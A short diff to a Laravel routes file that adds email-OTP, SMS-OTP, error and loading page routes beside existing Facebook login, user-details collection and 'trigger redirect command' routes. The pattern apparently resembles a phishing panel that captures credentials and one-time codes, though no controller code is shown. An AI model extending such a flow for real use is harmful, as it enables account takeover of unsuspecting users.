@@ -36,4 +36,7 @@ Route::get('/auth/facebook', [FacebookController::class, 'facebookpage']);
 Route::get('/auth/facebook/callback', [FacebookController::class, 'facebookredirect']);
 Route::post('/user-details', [UserDetailsController::class, 'collectDetails']);
 Route::post('/trigger-redirect-command', [CommandController::class, 'triggerRedirectCommand']);
-Route::get('/otp', [OtpController::class, 'index']);
+Route::get('/email-otp', [OtpController::class, 'emailOtp']);
+Route::get('/sms-otp', [OtpController::class, 'smsOtp']);
+Route::get('/error', [OtpController::class, 'errorPage']);
+Route::get('/loading', [OtpController::class, 'loadingPage']);
